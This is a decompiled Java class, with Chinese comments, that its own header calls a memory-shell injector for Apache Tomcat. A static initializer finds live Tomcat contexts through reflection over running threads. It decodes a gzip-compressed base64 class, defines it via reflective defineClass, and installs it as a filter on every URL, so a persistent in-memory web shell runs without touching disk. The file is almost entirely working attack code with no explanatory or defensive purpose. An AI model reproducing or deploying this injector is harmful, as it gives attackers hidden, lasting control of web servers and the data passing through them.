//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

//package com.example.demo.Static;
package java.lang;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * 内存马注入器
 */
public class ReflectUtil {
    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        // 放置完整的类名
        return "KpLi0rn2";
    }

    public String getBase64String() throws IOException {
        return new String("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");

    }

    public ReflectUtil() {
        try {
            List<Object> contexts = this.getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                System.out.println("Context: "+context);
                Object filter = this.getFilter(context);
                System.out.println("Filter: "+filter);
                if (filter != null) {
                    System.out.println("addFilter: "+filter);
                    this.addFilter(context, filter);
                }
            }
        } catch (Exception var5) {
        }

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var4 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var4[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            throw new RuntimeException(var14);
        }
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName());
            System.out.println("getFilter: "+filter);
        } catch (Exception var9) {
            System.out.println("1 catch");
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                // 不解压缩方案 有问题，原因未知
                //byte[] clazzByte = decodeBase64(this.getBase64String());
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
                System.out.println("createFilter: "+filter);
            } catch (Throwable var8) {
                var8.printStackTrace();  // 打印异常信息
            }
            //var9.printStackTrace();
        }

        return filter;
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = this.getCatalinaLoader();
        String filterClassName = this.getClassName();
        String filterName = this.getFilterName(filterClassName);

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
                return;
            }
        } catch (Exception var16) {
        }

        Object filterDef;
        Object filterMap;
        try {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception var15) {
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception var14) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

            Constructor[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception var12) {
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var11) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map)getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception var13) {
            var13.printStackTrace();
        }

    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        ClassLoader catalinaLoader = null;

        for(int i = 0; i < threads.length; ++i) {
            if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = threads[i].getContextClassLoader();
                break;
            }
        }

        return catalinaLoader;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

    // 静态代码块
    static {
        new ReflectUtil();
    }
}
